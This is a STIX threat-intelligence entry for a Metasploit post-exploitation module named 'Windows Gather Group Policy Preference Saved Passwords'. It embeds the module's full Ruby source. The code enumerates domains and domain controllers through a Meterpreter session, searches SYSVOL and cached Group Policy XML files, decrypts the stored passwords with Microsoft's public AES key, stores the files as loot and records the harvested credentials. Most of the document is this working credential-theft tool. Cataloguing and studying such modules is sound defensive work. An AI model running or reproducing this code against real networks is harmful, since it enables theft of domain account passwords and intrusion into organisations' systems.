{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70f48e1d-61d0-4aaa-ac73-4998c4e5512b",
    "created": "2024-08-14T16:33:11.443777Z",
    "modified": "2024-08-14T16:33:11.443781Z",
    "name": "Windows Gather Group Policy Preference Saved Passwords",
    "description": " This module enumerates the victim machine's domain controller and connects to it via SMB. It then looks for Group Policy Preference XML files containing local user accounts and passwords and decrypts them using Microsofts public AES key.  Cached Group Policy files may be found on end-user devices if the group policy object is deleted rather than unlinked.  Tested on WinXP SP3 Client and Win2k8 R2 DC.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/gpp.rb",
            "external_id": "gpp.rb"
        },
        {
            "source_name": "reference",
            "url": "http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)"
        },
        {
            "source_name": "reference",
            "url": "http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::File\n  include Msf::Post::Windows::ExtAPI\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::NetAPI\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Group Policy Preference Saved Passwords',\n        'Description' => %q{\n          This module enumerates the victim machine's domain controller and\n          connects to it via SMB. It then looks for Group Policy Preference XML\n          files containing local user accounts and passwords and decrypts them\n          using Microsofts public AES key.\n\n          Cached Group Policy files may be found on end-user devices if the group\n          policy object is deleted rather than unlinked.\n\n          Tested on WinXP SP3 Client and Win2k8 R2 DC.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ben Campbell',\n          'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',\n          'scriptmonkey <scriptmonkey[at]owobble.co.uk>',\n          'theLightCosine',\n          'mubix' # domain/dc enumeration code\n        ],\n        'References' => [\n          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],\n          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],\n          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],\n          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],\n          ['MSB', 'MS14-025']\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              extapi_adsi_domain_query\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),\n      OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),\n      OptString.new('DOMAINS', [false, 'Enumerate list of space separated domains DOMAINS=\"dom1 dom2\".'])\n    ])\n  end\n\n  def run\n    group_path = 'MACHINE\\\\Preferences\\\\Groups\\\\Groups.xml'\n    group_path_user = 'USER\\\\Preferences\\\\Groups\\\\Groups.xml'\n    service_path = 'MACHINE\\\\Preferences\\\\Services\\\\Services.xml'\n    printer_path = 'USER\\\\Preferences\\\\Printers\\\\Printers.xml'\n    drive_path = 'USER\\\\Preferences\\\\Drives\\\\Drives.xml'\n    datasource_path = 'MACHINE\\\\Preferences\\\\Datasources\\\\DataSources.xml'\n    datasource_path_user = 'USER\\\\Preferences\\\\Datasources\\\\DataSources.xml'\n    task_path = 'MACHINE\\\\Preferences\\\\ScheduledTasks\\\\ScheduledTasks.xml'\n    task_path_user = 'USER\\\\Preferences\\\\ScheduledTasks\\\\ScheduledTasks.xml'\n\n    domains = []\n    basepaths = []\n    fullpaths = []\n\n    print_status 'Checking for group policy history objects...'\n    all_users = get_env('%ALLUSERSPROFILE%')\n\n    unless all_users.include? 'ProgramData'\n      all_users = \"#{all_users}\\\\Application Data\"\n    end\n\n    cached = get_basepaths(\"#{all_users}\\\\Microsoft\\\\Group Policy\\\\History\", true)\n\n    unless cached.blank?\n      basepaths << cached\n      print_good 'Cached Group Policy folder found locally'\n    end\n\n    print_status 'Checking for SYSVOL locally...'\n    system_root = expand_path('%SYSTEMROOT%')\n    locals = get_basepaths(\"#{system_root}\\\\SYSVOL\\\\sysvol\")\n    unless locals.blank?\n      basepaths << locals\n      print_good 'SYSVOL Group Policy Files found locally'\n    end\n\n    # If user supplied domains this implicitly cancels the ALL flag.\n    if datastore['ALL'] && datastore['DOMAINS'].blank?\n      print_status 'Enumerating Domains on the Network...'\n      domains = enum_domains\n      domains.reject! { |n| n == 'WORKGROUP' || n.to_s.empty? }\n    end\n\n    # Add user specified domains to list.\n    unless datastore['DOMAINS'].blank?\n      if datastore['DOMAINS'].match(/\\./)\n        print_error \"DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'.\"\n        return\n      end\n      user_domains = datastore['DOMAINS'].split(' ')\n      user_domains = user_domains.map(&:upcase)\n      print_status \"Enumerating the user supplied Domain(s): #{user_domains.join(', ')}...\"\n      user_domains.each { |ud| domains << ud }\n    end\n\n    # If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.\n    # If user supplied domains we do not wish to enumerate registry retrieved domains.\n    if locals.blank? && user_domains.blank?\n      print_status 'Enumerating domain information from the local registry...'\n      domains << get_domain_reg\n    end\n\n    domains.flatten!\n    domains.compact!\n    domains.uniq!\n\n    # Dont check registry if we find local files.\n    cached_dc = get_cached_domain_controller if locals.blank?\n\n    domains.each do |domain|\n      dcs = enum_dcs(domain)\n      dcs = [] if dcs.nil?\n\n      # Add registry cached DC for the test case where no DC is enumerated on the network.\n      if !cached_dc.nil? && (cached_dc.include? domain)\n        dcs << cached_dc\n      end\n\n      next if dcs.blank?\n\n      dcs.uniq!\n      tbase = []\n      dcs.each do |dc|\n        print_status \"Searching for Policy Share on #{dc}...\"\n        tbase = get_basepaths(\"\\\\\\\\#{dc}\\\\SYSVOL\")\n        # If we got a basepath from the DC we know that we can reach it\n        # All DCs on the same domain should be the same so we only need one\n        next if tbase.blank?\n\n        print_good \"Found Policy Share on #{dc}\"\n        basepaths << tbase\n        break\n      end\n    end\n\n    basepaths.flatten!\n    basepaths.compact!\n    print_status 'Searching for Group Policy XML Files...'\n    basepaths.each do |policy_path|\n      fullpaths << find_path(policy_path, group_path)\n      fullpaths << find_path(policy_path, group_path_user)\n      fullpaths << find_path(policy_path, service_path)\n      fullpaths << find_path(policy_path, printer_path)\n      fullpaths << find_path(policy_path, drive_path)\n      fullpaths << find_path(policy_path, datasource_path)\n      fullpaths << find_path(policy_path, datasource_path_user)\n      fullpaths << find_path(policy_path, task_path)\n      fullpaths << find_path(policy_path, task_path_user)\n    end\n    fullpaths.flatten!\n    fullpaths.compact!\n    fullpaths.each do |filepath|\n      tmpfile = gpp_xml_file(filepath)\n      parse_xml(tmpfile) if tmpfile\n    end\n  end\n\n  def get_basepaths(base, cached = false)\n    locals = []\n    begin\n      session.fs.dir.foreach(base) do |sub|\n        next if sub =~ /^(\\.|\\.\\.)$/\n\n        # Local GPO are stored in C:\\Users\\All Users\\Microsoft\\Group\n        # Policy\\History\\{GUID}\\Machine\\etc without \\Policies\n        if cached\n          locals << \"#{base}\\\\#{sub}\\\\\"\n        else\n          tpath = \"#{base}\\\\#{sub}\\\\Policies\"\n\n          begin\n            session.fs.dir.foreach(tpath) do |sub2|\n              next if sub2 =~ /^(\\.|\\.\\.)$/\n\n              locals << \"#{tpath}\\\\#{sub2}\\\\\"\n            end\n          rescue Rex::Post::Meterpreter::RequestError => e\n            print_error \"Could not access #{tpath}  : #{e.message}\"\n          end\n        end\n      end\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error \"Error accessing #{base} : #{e.message}\"\n    end\n    return locals\n  end\n\n  def find_path(path, xml_path)\n    xml_path = \"#{path}#{xml_path}\"\n    begin\n      return xml_path if exist? xml_path\n    rescue Rex::Post::Meterpreter::RequestError\n      # No permissions for this specific file.\n      return nil\n    end\n  end\n\n  def adsi_query(domain, adsi_filter, adsi_fields)\n    return '' unless session.commands.include?(Rex::Post::Meterpreter::Extensions::Extapi::COMMAND_ID_EXTAPI_ADSI_DOMAIN_QUERY)\n\n    query_result = session.extapi.adsi.domain_query(domain, adsi_filter, 255, 255, adsi_fields)\n\n    if query_result[:results].empty?\n      return '' # adsi query failed\n    else\n      return query_result[:results]\n    end\n  end\n\n  def gpp_xml_file(path)\n    data = read_file(path)\n\n    spath = path.split('\\\\')\n    retobj = {\n      dc: spath[2],\n      guid: spath[6],\n      path: path,\n      xml: data\n    }\n    if spath[4] == 'sysvol'\n      retobj[:domain] = spath[5]\n    else\n      retobj[:domain] = spath[4]\n    end\n\n    adsi_filter_gpo = \"(&(objectCategory=groupPolicyContainer)(name=#{retobj[:guid]}))\"\n    adsi_field_gpo = ['displayname', 'name']\n\n    gpo_adsi = adsi_query(retobj[:domain], adsi_filter_gpo, adsi_field_gpo)\n\n    unless gpo_adsi.empty?\n      gpo_name = gpo_adsi[0][0][:value]\n      gpo_guid = gpo_adsi[0][1][:value]\n      retobj[:name] = gpo_name if retobj[:guid] == gpo_guid\n    end\n\n    return retobj\n  rescue Rex::Post::Meterpreter::RequestError => e\n    print_error \"Received error code #{e.code} when reading #{path}\"\n    return nil\n  end\n\n  def parse_xml(xmlfile)\n    mxml = xmlfile[:xml]\n    print_status \"Parsing file: #{xmlfile[:path]} ...\"\n    filetype = File.basename(xmlfile[:path].gsub('\\\\', '/'))\n    results = Rex::Parser::GPP.parse(mxml)\n\n    tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])\n\n    tables.each do |table|\n      table << ['NAME', xmlfile[:name]] if xmlfile.member?(:name)\n      print_good \" #{table}\\n\\n\"\n    end\n\n    results.each do |result|\n      if datastore['STORE']\n        stored_path = store_loot('microsoft.windows.gpp', 'text/xml', session, xmlfile[:xml], filetype, xmlfile[:path])\n        print_good(\"XML file saved to: #{stored_path}\")\n        print_line\n      end\n\n      report_creds(result[:USER], result[:PASS], result[:DISABLED])\n    end\n  end\n\n  def report_creds(user, password, _disabled)\n    service_data = {\n      address: session.session_host,\n      port: 445,\n      protocol: 'tcp',\n      service_name: 'smb',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      username: user,\n      private_data: password,\n      private_type: :password\n    }\n\n    credential_core = create_credential(credential_data.merge(service_data))\n\n    login_data = {\n      core: credential_core,\n      access_level: 'User',\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }\n\n    create_credential_login(login_data.merge(service_data))\n  end\n\n  def enum_domains\n    domains = []\n    results = net_server_enum(SV_TYPE_DOMAIN_ENUM)\n\n    if results\n      results.each do |domain|\n        domains << domain[:name]\n      end\n\n      domains.uniq!\n      print_status(\"Retrieved Domain(s) #{domains.join(', ')} from network\")\n    end\n\n    domains\n  end\n\n  def enum_dcs(domain)\n    hostnames = nil\n    # Prevent crash if FQDN domain names are searched for or other disallowed characters:\n    # http://support.microsoft.com/kb/909264 \\/:*?\"<>|\n    if domain =~ %r{[:*?\"<>\\\\/.]}\n      print_error(\"Cannot enumerate domain name contains disallowed characters: #{domain}\")\n      return nil\n    end\n\n    print_status(\"Enumerating DCs for #{domain} on the network...\")\n    results = net_server_enum(SV_TYPE_DOMAIN_CTRL | SV_TYPE_DOMAIN_BAKCTRL, domain)\n\n    if results.blank?\n      print_error(\"No Domain Controllers found for #{domain}\")\n    else\n      hostnames = []\n      results.each do |dc|\n        print_good \"DC Found: #{dc[:name]}\"\n        hostnames << dc[:name]\n      end\n    end\n\n    hostnames\n  end\n\n  # We use this for the odd test case where a DC is unable to be enumerated from the network\n  # but is cached in the registry.\n  def get_cached_domain_controller\n    subkey = 'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Group Policy\\\\History\\\\'\n    v_name = 'DCName'\n    dc = registry_getvaldata(subkey, v_name).gsub(/\\\\/, '').upcase\n    print_status \"Retrieved DC #{dc} from registry\"\n    return dc\n  rescue StandardError\n    print_status('No DC found in registry')\n  end\n\n  def get_domain_reg\n    locations = []\n    # Lots of redundancy but hey this is quick!\n    locations << ['HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\\\\', 'Domain']\n    locations << ['HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\', 'DefaultDomainName']\n    locations << ['HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Group Policy\\\\History\\\\', 'MachineDomain']\n\n    domains = []\n\n    # Pulls cached domains from registry\n    domain_cache = registry_enumvals('HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\DomainCache\\\\')\n    if domain_cache\n      domain_cache.each { |ud| domains << ud }\n    end\n\n    locations.each do |location|\n      begin\n        subkey = location[0]\n        v_name = location[1]\n        domain = registry_getvaldata(subkey, v_name)\n      rescue Rex::Post::Meterpreter::RequestError => e\n        print_error \"Received error code #{e.code} - #{e.message}\"\n      end\n\n      unless domain.blank?\n        domain_parts = domain.split('.')\n        domains << domain.split('.').first.upcase unless domain_parts.empty?\n      end\n    end\n\n    domains.uniq!\n    print_status \"Retrieved Domain(s) #{domains.join(', ')} from registry\"\n\n    return domains\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}